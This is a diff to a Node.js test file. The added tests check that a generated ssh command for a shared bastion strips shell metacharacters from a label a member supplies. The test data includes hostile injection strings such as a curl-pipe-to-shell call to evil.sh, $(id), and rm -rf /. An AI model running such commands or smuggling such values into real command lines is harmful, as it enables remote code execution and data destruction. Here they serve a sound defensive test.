@@ -2,9 +2,11 @@
 // `npm test` builds first, so these always exercise what ships.
 import { strict as assert } from "node:assert";
 import { test } from "node:test";
-import { mkdtempSync, rmSync } from "node:fs";
+import { mkdtempSync, rmSync, copyFileSync, writeFileSync } from "node:fs";
 import { tmpdir } from "node:os";
-import { join } from "node:path";
+import { basename, join } from "node:path";
+import { fileURLToPath } from "node:url";
+import { spawn } from "node:child_process";
 
 // Isolate every module-level store the modules mint on import.
 process.env.ISOLATION_SERVER_HOME = mkdtempSync(join(tmpdir(), "iso-test-"));
@@ -427,6 +429,64 @@ test("attachCommand refuses anything but a real port and a real view id — it b
   assert.equal(attachCommand(70000, "v-abc"), undefined);
   assert.equal(attachCommand(1.5, "v-abc"), undefined);
   assert.equal(attachCommand(undefined, "v-abc"), undefined);
+});
+
+test("chatCommand takes the same gate, and strips the one part a person chose down to what cannot act", async () => {
+  // The plain-ssh door carries a LABEL, and a label is member-supplied text landing inside single
+  // quotes in a line a SHARED bastion runs. A quote in it would close them; everything after would
+  // be the member's shell. So the label is reduced to characters with no meaning to a shell at all,
+  // rather than escaped — there is nothing here worth the risk of getting an escape subtly wrong.
+  const { chatCommand } = await import("../dist/acpview.js");
+  assert.match(chatCommand(45000, "v-abc123", "Buzz"), / \/tmp\/\.iso-acp-chat\.mjs 45000 v-abc123 'Buzz'$/);
+  for (const hostile of ["'; curl evil.sh | sh; #", "$(id)", "`id`", "a\nb", ";rm -rf /"]) {
+    const line = chatCommand(45000, "v-abc123", hostile);
+    assert.equal(line.match(/'/g).length, 2, `the label must not add a quote: ${line}`);
+    assert.ok(!/[$`;|&<>()\n\\]/.test(line.slice(line.indexOf("v-abc123"))), `nothing that acts survives: ${line}`);
+  }
+  // A label is a display name, not an identifier: an empty or unusable one still opens the door.
+  assert.match(chatCommand(45000, "v-abc123", ""), /'agent'$/);
+  assert.match(chatCommand(45000, "v-abc123", "   "), /'agent'$/);
+  assert.match(chatCommand(45000, "v-abc123", null), /'agent'$/);
+  assert.match(chatCommand(45000, "v-abc123", "x".repeat(200)), /'x{40}'$/);
+  // The port and the view id are the SAME pair the attach line takes, and refused the same way —
+  // no route is registered rather than one whose command is garbage.
+  assert.equal(chatCommand(45000, "v-a; rm -rf /", "Buzz"), undefined);
+  assert.equal(chatCommand(0, "v-abc", "Buzz"), undefined);
+  assert.equal(chatCommand(70000, "v-abc", "Buzz"), undefined);
+  assert.equal(chatCommand(undefined, "v-abc", "Buzz"), undefined);
+});
+
+test("the rendered client spawns the attach script AT THE PATH the server writes — a dotted sibling", async () => {
+  // `acpview.ts` writes both in-sandbox scripts into /tmp as DOTFILES, and the chat client resolves
+  // the attach script beside itself. Lose the dot and the spawn names a file that is never there:
+  // the door dies before its first byte, saying only "the conversation closed" — and nothing else in
+  // the stack would notice, because the route registers, the bastion execs, and node exits 1.
+  const { ATTACH_PATH, CHAT_PATH } = await import("../dist/acpview.js");
+  const dir = mkdtempSync(join(tmpdir(), "iso-chat-"));
+  try {
+    const chat = join(dir, basename(CHAT_PATH));
+    copyFileSync(fileURLToPath(new URL("../dist/sandbox/iso-acp-chat.mjs", import.meta.url)), chat);
+    // A stand-in bridge: say hello the way the real one does, then stay up so the client renders it.
+    writeFileSync(
+      join(dir, basename(ATTACH_PATH)),
+      `process.stdout.write(JSON.stringify({ jsonrpc: "2.0", method: "_iso/hello", params: { sessionId: "s-1", viewId: process.argv[3], updates: [] } }) + "\\n");\nsetTimeout(() => {}, 5000);\n`,
+    );
+    const child = spawn(process.execPath, [chat, "45000", "v-abc123", "Buzz"], { stdio: ["pipe", "pipe", "pipe"] });
+    let out = "";
+    const seen = new Promise((resolve) => {
+      child.stdout.on("data", (d) => {
+        out += String(d);
+        if (out.includes("Buzz")) resolve(true);
+      });
+      setTimeout(() => resolve(false), 5000);
+    });
+    const ok = await seen;
+    child.kill();
+    assert.ok(ok, `the client never reached the bridge — it renders: ${JSON.stringify(out)}`);
+    assert.match(out, /— Buzz/, "and it is THIS agent's conversation the transcript is headed with");
+  } finally {
+    rmSync(dir, { recursive: true, force: true });
+  }
 });
 
 // --- the private tunnel -------------------------------------------------------
